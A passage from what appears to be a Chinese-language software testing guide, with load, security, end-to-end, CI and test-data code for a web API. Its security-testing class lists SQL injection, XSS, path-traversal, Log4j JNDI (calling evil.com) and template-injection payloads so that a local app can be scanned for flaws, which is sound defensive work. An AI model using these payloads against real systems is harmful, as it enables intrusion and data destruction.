        best_rps_index = results.index(best_rps)
        
        print(f"\n最佳性能点: {(best_rps_index + 1) * 10} 并发用户")
        print(f"最大RPS: {best_rps.requests_per_second:.2f}")

# 使用示例
async def performance_test_example():
    # 创建负载测试器
    load_tester = LoadTester("http://localhost:8000")
    
    # 执行负载测试
    print("执行API负载测试...")
    metrics = await load_tester.load_test(
        method="GET",
        endpoint="/api/users",
        concurrent_users=20,
        total_requests=200,
        headers={"Authorization": "Bearer test_token"}
    )
    
    load_tester.print_results(metrics)
    
    # 执行压力测试
    print("\n执行压力测试...")
    stress_tester = StressTester(load_tester)
    stress_results = await stress_tester.stress_test(
        method="GET",
        endpoint="/api/users",
        max_users=100,
        step_size=10,
        step_duration=30
    )
    
    stress_tester.analyze_stress_results(stress_results)

# 数据库性能测试
class DatabasePerformanceTester:
    """数据库性能测试器"""
    
    def __init__(self, session):
        self.session = session
    
    async def test_query_performance(
        self,
        query_func: Callable,
        iterations: int = 100
    ) -> Dict[str, float]:
        """测试查询性能"""
        execution_times = []
        
        for _ in range(iterations):
            start_time = time.time()
            await query_func()
            execution_time = time.time() - start_time
            execution_times.append(execution_time)
        
        return {
            "avg_time": statistics.mean(execution_times),
            "min_time": min(execution_times),
            "max_time": max(execution_times),
            "p95_time": statistics.quantiles(execution_times, n=20)[18],
            "total_time": sum(execution_times)
        }
    
    async def test_concurrent_queries(
        self,
        query_func: Callable,
        concurrent_count: int = 10,
        iterations_per_worker: int = 10
    ) -> Dict[str, Any]:
        """测试并发查询性能"""
        async def worker():
            times = []
            for _ in range(iterations_per_worker):
                start_time = time.time()
                await query_func()
                times.append(time.time() - start_time)
            return times
        
        # 创建并发任务
        tasks = [worker() for _ in range(concurrent_count)]
        
        start_time = time.time()
        results = await asyncio.gather(*tasks)
        total_time = time.time() - start_time
        
        # 合并所有执行时间
        all_times = []
        for worker_times in results:
            all_times.extend(worker_times)
        
        total_queries = concurrent_count * iterations_per_worker
        
        return {
            "total_queries": total_queries,
            "total_time": total_time,
            "queries_per_second": total_queries / total_time,
            "avg_query_time": statistics.mean(all_times),
            "p95_query_time": statistics.quantiles(all_times, n=20)[18]
        }

# pytest性能测试集成
class TestPerformance:
    """性能测试类"""
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_api_response_time(self):
        """测试API响应时间"""
        load_tester = LoadTester("http://localhost:8000")
        
        metrics = await load_tester.load_test(
            method="GET",
            endpoint="/api/health",
            concurrent_users=1,
            total_requests=10
        )
        
        # 断言响应时间要求
        assert metrics.avg_response_time < 0.5  # 平均响应时间小于500ms
        assert metrics.error_rate < 0.01  # 错误率小于1%
        assert metrics.p95_response_time < 1.0  # 95%响应时间小于1s
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_database_query_performance(self):
        """测试数据库查询性能"""
        # 这里需要实际的数据库连接
        # db_tester = DatabasePerformanceTester(session)
        # 
        # async def sample_query():
        #     return await session.execute("SELECT * FROM users LIMIT 100")
        # 
        # metrics = await db_tester.test_query_performance(sample_query, 50)
        # assert metrics["avg_time"] < 0.1  # 平均查询时间小于100ms
        pass
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_concurrent_load(self):
        """测试并发负载"""
        load_tester = LoadTester("http://localhost:8000")
        
        metrics = await load_tester.load_test(
            method="GET",
            endpoint="/api/users",
            concurrent_users=50,
            total_requests=500
        )
        
        # 断言并发性能要求
        assert metrics.requests_per_second > 100  # 每秒处理超过100个请求
        assert metrics.error_rate < 0.05  # 错误率小于5%

# 内存和资源使用测试
class ResourceUsageTester:
    """资源使用测试器"""
    
    def __init__(self):
        self.memory_samples = []
        self.cpu_samples = []
    
    def start_monitoring(self):
        """开始监控资源使用"""
        import psutil
        import threading
        import time
        
        self.monitoring = True
        
        def monitor():
            process = psutil.Process()
            while self.monitoring:
                self.memory_samples.append(process.memory_info().rss / 1024 / 1024)  # MB
                self.cpu_samples.append(process.cpu_percent())
                time.sleep(1)
        
        self.monitor_thread = threading.Thread(target=monitor)
        self.monitor_thread.start()
    
    def stop_monitoring(self):
        """停止监控资源使用"""
        self.monitoring = False
        if hasattr(self, 'monitor_thread'):
            self.monitor_thread.join()
    
    def get_resource_stats(self) -> Dict[str, float]:
        """获取资源使用统计"""
        if not self.memory_samples or not self.cpu_samples:
            return {}
        
        return {
            "avg_memory_mb": statistics.mean(self.memory_samples),
            "max_memory_mb": max(self.memory_samples),
            "avg_cpu_percent": statistics.mean(self.cpu_samples),
            "max_cpu_percent": max(self.cpu_samples)
        }

## 🔒 安全测试

### 1. 安全测试实现

```python
import pytest
import asyncio
from typing import List, Dict, Any
import re
import base64
import json

class SecurityTester:
    """安全测试器"""
    
    def __init__(self, client):
        self.client = client
        self.vulnerabilities = []
    
    async def test_sql_injection(self, endpoint: str, params: Dict[str, str]):
        """测试SQL注入漏洞"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        for param_name, original_value in params.items():
            for payload in sql_payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                response = await self.client.get(endpoint, params=test_params)
                
                # 检查是否存在SQL错误信息
                if response.status_code == 500:
                    response_text = response.text.lower()
                    sql_errors = [
                        "sql syntax", "mysql", "postgresql", "sqlite",
                        "ora-", "syntax error", "quoted string"
                    ]
                    
                    for error in sql_errors:
                        if error in response_text:
                            self.vulnerabilities.append({
                                "type": "SQL Injection",
                                "endpoint": endpoint,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": error
                            })
                            break
    
    async def test_xss_vulnerabilities(self, endpoint: str, data: Dict[str, Any]):
        """测试XSS漏洞"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>"
        ]
        
        for field_name, original_value in data.items():
            if isinstance(original_value, str):
                for payload in xss_payloads:
                    test_data = data.copy()
                    test_data[field_name] = payload
                    
                    response = await self.client.post(endpoint, json=test_data)
                    
                    # 检查响应中是否包含未转义的脚本
                    if payload in response.text:
                        self.vulnerabilities.append({
                            "type": "XSS",
                            "endpoint": endpoint,
                            "field": field_name,
                            "payload": payload,
                            "evidence": "Payload reflected in response"
                        })
    
    async def test_authentication_bypass(self, protected_endpoints: List[str]):
        """测试认证绕过"""
        bypass_attempts = [
            {},  # 无认证头
            {"Authorization": "Bearer invalid_token"},
            {"Authorization": "Bearer "},
            {"Authorization": "Basic invalid"},
            {"X-User-ID": "1"},  # 尝试直接设置用户ID
        ]
        
        for endpoint in protected_endpoints:
            for headers in bypass_attempts:
                response = await self.client.get(endpoint, headers=headers)
                
                # 受保护的端点应该返回401或403
                if response.status_code not in [401, 403]:
                    self.vulnerabilities.append({
                        "type": "Authentication Bypass",
                        "endpoint": endpoint,
                        "headers": headers,
                        "status_code": response.status_code,
                        "evidence": "Protected endpoint accessible without proper authentication"
                    })
    
    async def test_authorization_flaws(self, user_endpoints: Dict[str, str]):
        """测试授权缺陷"""
        # user_endpoints: {"user1_token": "/api/users/1", "user2_token": "/api/users/2"}
        
        tokens = list(user_endpoints.keys())
        if len(tokens) < 2:
            return
        
        # 测试用户A是否能访问用户B的资源
        for i, (token_a, endpoint_a) in enumerate(user_endpoints.items()):
            for j, (token_b, endpoint_b) in enumerate(user_endpoints.items()):
                if i != j:  # 不同用户
                    headers = {"Authorization": f"Bearer {token_a}"}
                    response = await self.client.get(endpoint_b, headers=headers)
                    
                    # 用户A不应该能访问用户B的资源
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "Authorization Flaw",
                            "endpoint": endpoint_b,
                            "token_used": token_a,
                            "evidence": "User can access other user's resources"
                        })
    
    async def test_input_validation(self, endpoints: List[Dict[str, Any]]):
        """测试输入验证"""
        invalid_inputs = [
            "A" * 10000,  # 超长字符串
            "../../../etc/passwd",  # 路径遍历
            "${jndi:ldap://evil.com/a}",  # Log4j漏洞
            "{{7*7}}",  # 模板注入
            "<script>alert(1)</script>",  # XSS
            "'; DROP TABLE users; --",  # SQL注入
        ]
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info["url"]
            method = endpoint_info.get("method", "POST")
            fields = endpoint_info.get("fields", {})
            
            for field_name in fields:
                for invalid_input in invalid_inputs:
                    test_data = fields.copy()
                    test_data[field_name] = invalid_input
                    
                    if method.upper() == "POST":
                        response = await self.client.post(endpoint, json=test_data)
                    else:
                        response = await self.client.get(endpoint, params=test_data)
                    
                    # 检查是否返回了适当的错误
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "Input Validation",
                            "endpoint": endpoint,
                            "field": field_name,
                            "input": invalid_input[:100],  # 截断显示
                            "evidence": "Invalid input accepted"
                        })
    
    def generate_security_report(self) -> Dict[str, Any]:
        """生成安全测试报告"""
        vulnerability_types = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln["type"]
            if vuln_type not in vulnerability_types:
                vulnerability_types[vuln_type] = 0
            vulnerability_types[vuln_type] += 1
        
        return {
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerability_types": vulnerability_types,
            "vulnerabilities": self.vulnerabilities,
            "security_score": max(0, 100 - len(self.vulnerabilities) * 10)
        }

class TestSecurity:
    """安全测试类"""
    
    @pytest.fixture
    async def security_tester(self, client):
        """安全测试器夹具"""
        return SecurityTester(client)
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sql_injection_protection(self, security_tester):
        """测试SQL注入防护"""
        await security_tester.test_sql_injection(
            "/api/users",
            {"search": "test", "filter": "active"}
        )
        
        # 检查是否发现SQL注入漏洞
        sql_vulns = [
            v for v in security_tester.vulnerabilities 
            if v["type"] == "SQL Injection"
        ]
        assert len(sql_vulns) == 0, f"发现SQL注入漏洞: {sql_vulns}"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_xss_protection(self, security_tester):
        """测试XSS防护"""
        await security_tester.test_xss_vulnerabilities(
            "/api/posts",
            {"title": "Test Post", "content": "Test content"}
        )
        
        xss_vulns = [
            v for v in security_tester.vulnerabilities 
            if v["type"] == "XSS"
        ]
        assert len(xss_vulns) == 0, f"发现XSS漏洞: {xss_vulns}"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_authentication_security(self, security_tester):
        """测试认证安全"""
        protected_endpoints = [
            "/api/users/me",
            "/api/admin/users",
            "/api/posts/create"
        ]
        
        await security_tester.test_authentication_bypass(protected_endpoints)
        
        auth_vulns = [
            v for v in security_tester.vulnerabilities 
            if v["type"] == "Authentication Bypass"
        ]
        assert len(auth_vulns) == 0, f"发现认证绕过漏洞: {auth_vulns}"

## 🎭 端到端测试

### 1. E2E测试实现

```python
import pytest
from playwright.async_api import async_playwright, Page, Browser
from typing import Dict, Any, List
import asyncio

class E2ETestBase:
    """端到端测试基类"""
    
    @pytest.fixture(scope="session")
    async def browser(self):
        """浏览器夹具"""
        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,  # 在CI环境中使用无头模式
                args=['--no-sandbox', '--disable-dev-shm-usage']
            )
            yield browser
            await browser.close()
    
    @pytest.fixture
    async def page(self, browser: Browser):
        """页面夹具"""
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()
        yield page
        await context.close()
    
    async def login_user(self, page: Page, username: str, password: str):
        """用户登录辅助方法"""
        await page.goto('http://localhost:3000/login')
        await page.fill('[data-testid="username-input"]', username)
        await page.fill('[data-testid="password-input"]', password)
        await page.click('[data-testid="login-button"]')
        
        # 等待登录完成
        await page.wait_for_url('**/dashboard')
    
    async def create_test_user(self) -> Dict[str, str]:
        """创建测试用户"""
        import uuid
        
        user_data = {
            "username": f"testuser_{uuid.uuid4().hex[:8]}",
            "email": f"test_{uuid.uuid4().hex[:8]}@example.com",
            "password": "TestPassword123!"
        }
        
        # 通过API创建用户
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.post(
                'http://localhost:8000/api/auth/register',
                json=user_data
            ) as response:
                if response.status == 201:
                    return user_data
                else:
                    raise Exception(f"Failed to create test user: {await response.text()}")

class TestUserJourney(E2ETestBase):
    """用户旅程端到端测试"""
    
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_user_registration_flow(self, page: Page):
        """测试用户注册流程"""
        # 访问注册页面
        await page.goto('http://localhost:3000/register')
        
        # 填写注册表单
        await page.fill('[data-testid="username-input"]', 'newuser123')
        await page.fill('[data-testid="email-input"]', 'newuser@example.com')
        await page.fill('[data-testid="password-input"]', 'Password123!')
        await page.fill('[data-testid="confirm-password-input"]', 'Password123!')
        
        # 提交表单
        await page.click('[data-testid="register-button"]')
        
        # 验证注册成功
        await page.wait_for_selector('[data-testid="success-message"]')
        success_message = await page.text_content('[data-testid="success-message"]')
        assert "注册成功" in success_message
        
        # 验证跳转到登录页面
        await page.wait_for_url('**/login')
    
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_login_and_dashboard_access(self, page: Page):
        """测试登录和仪表板访问"""
        # 创建测试用户
        user_data = await self.create_test_user()
        
        # 执行登录
        await self.login_user(page, user_data["username"], user_data["password"])
        
        # 验证仪表板页面
        await page.wait_for_selector('[data-testid="dashboard-title"]')
        dashboard_title = await page.text_content('[data-testid="dashboard-title"]')
        assert "仪表板" in dashboard_title
        
        # 验证用户信息显示
        await page.wait_for_selector('[data-testid="user-info"]')
        user_info = await page.text_content('[data-testid="user-info"]')
        assert user_data["username"] in user_info
    
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_post_creation_workflow(self, page: Page):
        """测试文章创建工作流"""
        # 登录用户
        user_data = await self.create_test_user()
        await self.login_user(page, user_data["username"], user_data["password"])
        
        # 导航到文章创建页面
        await page.click('[data-testid="create-post-link"]')
        await page.wait_for_url('**/posts/create')
        
        # 填写文章表单
        await page.fill('[data-testid="post-title-input"]', '我的第一篇文章')
        await page.fill('[data-testid="post-content-textarea"]', '这是文章的内容...')
        await page.fill('[data-testid="post-tags-input"]', 'test,e2e')
        
        # 提交文章
        await page.click('[data-testid="publish-button"]')
        
        # 验证文章创建成功
        await page.wait_for_selector('[data-testid="post-success-message"]')
        
        # 验证跳转到文章详情页
        await page.wait_for_url('**/posts/*')
        
        # 验证文章内容显示
        post_title = await page.text_content('[data-testid="post-title"]')
        assert post_title == '我的第一篇文章'
        
        post_content = await page.text_content('[data-testid="post-content"]')
        assert '这是文章的内容' in post_content
    
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_search_functionality(self, page: Page):
        """测试搜索功能"""
        # 登录用户
        user_data = await self.create_test_user()
        await self.login_user(page, user_data["username"], user_data["password"])
        
        # 导航到搜索页面
        await page.goto('http://localhost:3000/search')
        
        # 执行搜索
        await page.fill('[data-testid="search-input"]', 'Python')
        await page.click('[data-testid="search-button"]')
        
        # 等待搜索结果
        await page.wait_for_selector('[data-testid="search-results"]')
        
        # 验证搜索结果
        search_results = await page.query_selector_all('[data-testid="search-result-item"]')
        assert len(search_results) > 0
        
        # 验证搜索结果包含关键词
        first_result = await search_results[0].text_content()
        assert 'Python' in first_result or 'python' in first_result.lower()
    
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_user_profile_update(self, page: Page):
        """测试用户资料更新"""
        # 登录用户
        user_data = await self.create_test_user()
        await self.login_user(page, user_data["username"], user_data["password"])
        
        # 导航到用户资料页面
        await page.click('[data-testid="user-menu"]')
        await page.click('[data-testid="profile-link"]')
        await page.wait_for_url('**/profile')
        
        # 编辑资料
        await page.click('[data-testid="edit-profile-button"]')
        await page.fill('[data-testid="full-name-input"]', '张三')
        await page.fill('[data-testid="bio-textarea"]', '这是我的个人简介')
        
        # 保存更改
        await page.click('[data-testid="save-profile-button"]')
        
        # 验证更新成功
        await page.wait_for_selector('[data-testid="profile-updated-message"]')
        
        # 验证更新后的信息显示
        full_name = await page.text_content('[data-testid="profile-full-name"]')
        assert full_name == '张三'
        
        bio = await page.text_content('[data-testid="profile-bio"]')
        assert '这是我的个人简介' in bio

class TestMobileResponsive(E2ETestBase):
    """移动端响应式测试"""
    
    @pytest.fixture
    async def mobile_page(self, browser: Browser):
        """移动端页面夹具"""
        context = await browser.new_context(
            viewport={'width': 375, 'height': 667},  # iPhone SE尺寸
            user_agent='Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
        )
        page = await context.new_page()
        yield page
        await context.close()
    
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_mobile_navigation(self, mobile_page: Page):
        """测试移动端导航"""
        await mobile_page.goto('http://localhost:3000')
        
        # 检查移动端菜单按钮
        menu_button = mobile_page.locator('[data-testid="mobile-menu-button"]')
        await menu_button.wait_for()
        assert await menu_button.is_visible()
        
        # 点击菜单按钮
        await menu_button.click()
        
        # 验证菜单展开
        mobile_menu = mobile_page.locator('[data-testid="mobile-menu"]')
        await mobile_menu.wait_for()
        assert await mobile_menu.is_visible()
    
    @pytest.mark.e2e
    @pytest.mark.asyncio
    async def test_mobile_form_interaction(self, mobile_page: Page):
        """测试移动端表单交互"""
        await mobile_page.goto('http://localhost:3000/login')
        
        # 测试表单字段在移动端的可用性
        username_input = mobile_page.locator('[data-testid="username-input"]')
        await username_input.wait_for()
        
        # 验证输入框可以获得焦点
        await username_input.click()
        assert await username_input.is_focused()
        
        # 测试虚拟键盘不会遮挡表单
        await username_input.fill('testuser')
        
        # 验证登录按钮仍然可见
        login_button = mobile_page.locator('[data-testid="login-button"]')
        assert await login_button.is_visible()

## 🤖 测试自动化

### 1. CI/CD集成

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.8, 3.9, '3.10', '3.11']
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install -r requirements-test.txt
    
    - name: Run unit tests
      run: |
        pytest tests/unit/ -v --cov=templates --cov-report=xml
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    services:
      postgres:
        image: postgres:13
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: test_db
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:6
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install -r requirements-test.txt
    
    - name: Run integration tests
      env:
        DATABASE_URL: postgresql://postgres:postgres@localhost:5432/test_db
        REDIS_URL: redis://localhost:6379/0
      run: |
        pytest tests/integration/ -v

  e2e-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install playwright
        playwright install chromium
    
    - name: Start application
      run: |
        python -m uvicorn templates.api.main:app --host 0.0.0.0 --port 8000 &
        sleep 10
    
    - name: Run E2E tests
      run: |
        pytest tests/e2e/ -v --browser chromium

  security-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Run security scan
      uses: securecodewarrior/github-action-add-sarif@v1
      with:
        sarif-file: 'security-scan-results.sarif'
    
    - name: Run dependency check
      run: |
        pip install safety
        safety check --json --output safety-report.json

  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.10'
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install locust
    
    - name: Run performance tests
      run: |
        locust -f tests/performance/locustfile.py --headless -u 50 -r 10 -t 60s --host http://localhost:8000
```

### 2. 测试报告生成

```python
import pytest
import json
import time
from typing import Dict, List, Any
from dataclasses import dataclass, asdict
from pathlib import Path

@dataclass
class TestResult:
    """测试结果"""
    name: str
    status: str  # passed, failed, skipped
    duration: float
    error_message: str = None
    traceback: str = None

@dataclass
class TestSuiteReport:
    """测试套件报告"""
    suite_name: str
    total_tests: int
    passed_tests: int
    failed_tests: int
    skipped_tests: int
    total_duration: float
    coverage_percentage: float
    test_results: List[TestResult]

class TestReportGenerator:
    """测试报告生成器"""
    
    def __init__(self, output_dir: str = "test-reports"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.reports: List[TestSuiteReport] = []
    
    def add_suite_report(self, report: TestSuiteReport):
        """添加测试套件报告"""
        self.reports.append(report)
    
    def generate_json_report(self) -> str:
        """生成JSON格式报告"""
        report_data = {
            "timestamp": time.time(),
            "total_suites": len(self.reports),
            "suites": [asdict(report) for report in self.reports]
        }
        
        json_file = self.output_dir / "test-report.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        return str(json_file)
    
    def generate_html_report(self) -> str:
        """生成HTML格式报告"""
        html_content = self._create_html_template()
        
        html_file = self.output_dir / "test-report.html"
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        return str(html_file)
    
    def _create_html_template(self) -> str:
        """创建HTML模板"""
        total_tests = sum(report.total_tests for report in self.reports)
        total_passed = sum(report.passed_tests for report in self.reports)
        total_failed = sum(report.failed_tests for report in self.reports)
        total_skipped = sum(report.skipped_tests for report in self.reports)
        
        pass_rate = (total_passed / total_tests * 100) if total_tests > 0 else 0
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>测试报告</title>
            <meta charset="utf-8">
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .summary {{ background: #f5f5f5; padding: 20px; border-radius: 5px; }}
                .suite {{ margin: 20px 0; border: 1px solid #ddd; border-radius: 5px; }}
                .suite-header {{ background: #e9e9e9; padding: 10px; font-weight: bold; }}
                .test-result {{ padding: 10px; border-bottom: 1px solid #eee; }}
                .passed {{ color: green; }}
                .failed {{ color: red; }}
                .skipped {{ color: orange; }}
                .progress-bar {{ width: 100%; height: 20px; background: #f0f0f0; border-radius: 10px; overflow: hidden; }}
                .progress-fill {{ height: 100%; background: linear-gradient(to right, #4CAF50 0%, #4CAF50 {pass_rate}%, #f44336 {pass_rate}%, #f44336 100%); }}
            </style>
        </head>
        <body>
            <h1>测试报告</h1>
            
            <div class="summary">
                <h2>总体概况</h2>
                <p>总测试数: {total_tests}</p>
                <p>通过: <span class="passed">{total_passed}</span></p>
                <p>失败: <span class="failed">{total_failed}</span></p>
                <p>跳过: <span class="skipped">{total_skipped}</span></p>
                <p>通过率: {pass_rate:.1f}%</p>
                
                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>
            </div>
        """
        
        for report in self.reports:
            html += f"""
            <div class="suite">
                <div class="suite-header">
                    {report.suite_name} - {report.passed_tests}/{report.total_tests} 通过
                </div>
            """
            
            for test_result in report.test_results:
                status_class = test_result.status
                html += f"""
                <div class="test-result">
                    <span class="{status_class}">[{test_result.status.upper()}]</span>
                    {test_result.name} ({test_result.duration:.3f}s)
                """
                
                if test_result.error_message:
                    html += f"<br><small>错误: {test_result.error_message}</small>"
                
                html += "</div>"
            
            html += "</div>"
        
        html += """
        </body>
        </html>
        """
        
        return html
    
    def generate_coverage_report(self, coverage_data: Dict[str, Any]) -> str:
        """生成覆盖率报告"""
        coverage_file = self.output_dir / "coverage-report.html"
        
        # 这里可以集成coverage.py生成详细的覆盖率报告
        # 或者使用现有的覆盖率数据生成简化报告
        
        return str(coverage_file)

# pytest插件集成
class TestReportPlugin:
    """pytest报告插件"""
    
    def __init__(self):
        self.report_generator = TestReportGenerator()
        self.current_suite = None
        self.test_results = []
    
    def pytest_runtest_setup(self, item):
        """测试设置阶段"""
        self.start_time = time.time()
    
    def pytest_runtest_call(self, item):
        """测试执行阶段"""
        pass
    
    def pytest_runtest_teardown(self, item):
        """测试清理阶段"""
        pass
    
    def pytest_runtest_logreport(self, report):
        """测试日志报告"""
        if report.when == "call":
            test_result = TestResult(
                name=report.nodeid,
                status=report.outcome,
                duration=report.duration,
                error_message=str(report.longrepr) if report.failed else None
            )
            self.test_results.append(test_result)
    
    def pytest_sessionfinish(self, session):
        """测试会话结束"""
        # 生成报告
        total_tests = len(self.test_results)
        passed_tests = len([r for r in self.test_results if r.status == "passed"])
        failed_tests = len([r for r in self.test_results if r.status == "failed"])
        skipped_tests = len([r for r in self.test_results if r.status == "skipped"])
        
        suite_report = TestSuiteReport(
            suite_name="All Tests",
            total_tests=total_tests,
            passed_tests=passed_tests,
            failed_tests=failed_tests,
            skipped_tests=skipped_tests,
            total_duration=sum(r.duration for r in self.test_results),
            coverage_percentage=0.0,  # 需要从coverage工具获取
            test_results=self.test_results
        )
        
        self.report_generator.add_suite_report(suite_report)
        
        # 生成报告文件
        json_report = self.report_generator.generate_json_report()
        html_report = self.report_generator.generate_html_report()
        
        print(f"\n测试报告已生成:")
        print(f"JSON报告: {json_report}")
        print(f"HTML报告: {html_report}")

# 在conftest.py中注册插件
def pytest_configure(config):
    """配置pytest插件"""
    config.pluginmanager.register(TestReportPlugin(), "test_report_plugin")
```

## 📊 测试数据管理

### 1. 测试数据工厂

```python
import factory
import faker
from typing import Dict, Any, List
from datetime import datetime, timedelta
import random

class BaseFactory(factory.Factory):
    """基础工厂类"""
    
    class Meta:
        abstract = True
    
    @classmethod
    def create_batch_dict(cls, size: int, **kwargs) -> List[Dict[str, Any]]:
        """批量创建字典数据"""
        return [cls.build(**kwargs) for _ in range(size)]

class UserFactory(BaseFactory):
    """用户数据工厂"""
    
    class Meta:
        model = dict
    
    id = factory.Sequence(lambda n: n + 1)
    username = factory.Faker('user_name')
    email = factory.Faker('email')
    full_name = factory.Faker('name')
    password_hash = factory.LazyAttribute(lambda obj: f"hashed_{obj.username}")
    is_active = True
    is_verified = factory.Faker('boolean', chance_of_getting_true=80)
    created_at = factory.Faker('date_time_between', start_date='-1y', end_date='now')
    updated_at = factory.LazyAttribute(lambda obj: obj.created_at + timedelta(days=random.randint(0, 30)))
    
    @factory.post_generation
    def set_profile(obj, create, extracted, **kwargs):
        """设置用户资料"""
        if extracted:
            obj.update(extracted)

class PostFactory(BaseFactory):
    """文章数据工厂"""
    
    class Meta:
        model = dict
    
    id = factory.Sequence(lambda n: n + 1)
    title = factory.Faker('sentence', nb_words=6)
    content = factory.Faker('text', max_nb_chars=2000)
    author_id = factory.SubFactory(UserFactory)
    status = factory.Faker('random_element', elements=['draft', 'published', 'archived'])
    tags = factory.LazyFunction(lambda: [factory.Faker('word').generate() for _ in range(random.randint(1, 5))])
    view_count = factory.Faker('random_int', min=0, max=10000)
    like_count = factory.Faker('random_int', min=0, max=1000)
    created_at = factory.Faker('date_time_between', start_date='-6m', end_date='now')
    updated_at = factory.LazyAttribute(lambda obj: obj.created_at + timedelta(hours=random.randint(0, 72)))

class CommentFactory(BaseFactory):
    """评论数据工厂"""
    
    class Meta:
        model = dict
    
    id = factory.Sequence(lambda n: n + 1)
    content = factory.Faker('paragraph')
    author_id = factory.SubFactory(UserFactory)
    post_id = factory.SubFactory(PostFactory)
    parent_id = None  # 可以设置为其他评论的ID来创建回复
    is_approved = factory.Faker('boolean', chance_of_getting_true=90)
    created_at = factory.Faker('date_time_between', start_date='-3m', end_date='now')

class TestDataManager:
    """测试数据管理器"""
    
    def __init__(self):
        self.created_data = {
            'users': [],
            'posts': [],
            'comments': []
        }
    
    def create_test_scenario(self, scenario_name: str) -> Dict[str, Any]:
        """创建测试场景数据"""
        scenarios = {
            'basic_blog': self._create_basic_blog_scenario,
            'user_interaction': self._create_user_interaction_scenario,
            'content_moderation': self._create_content_moderation_scenario,
            'performance_test': self._create_performance_test_scenario
        }
        
        if scenario_name in scenarios:
            return scenarios[scenario_name]()
        else:
            raise ValueError(f"Unknown scenario: {scenario_name}")
    
    def _create_basic_blog_scenario(self) -> Dict[str, Any]:
        """创建基础博客场景"""
        # 创建用户
        users = UserFactory.create_batch_dict(5)
        
        # 创建文章
        posts = []
        for user in users:
            user_posts = PostFactory.create_batch_dict(
                random.randint(1, 3),
                author_id=user['id']
            )
            posts.extend(user_posts)
        
        # 创建评论
        comments = []
        for post in posts:
            post_comments = CommentFactory.create_batch_dict(
                random.randint(0, 5),
                post_id=post['id'],
                author_id=random.choice(users)['id']
            )
            comments.extend(post_comments)
        
        self.created_data['users'].extend(users)
        self.created_data['posts'].extend(posts)
        self.created_data['comments'].extend(comments)
        
        return {
            'users': users,
            'posts': posts,
            'comments': comments
        }
    
    def _create_user_interaction_scenario(self) -> Dict[str, Any]:
        """创建用户交互场景"""
        # 创建活跃用户和普通用户
        active_users = UserFactory.create_batch_dict(
            3,
            is_verified=True,
            created_at=datetime.now() - timedelta(days=30)
        )
        
        regular_users = UserFactory.create_batch_dict(
            7,
            is_verified=factory.Faker('boolean', chance_of_getting_true=70)
        )
        
        all_users = active_users + regular_users
        
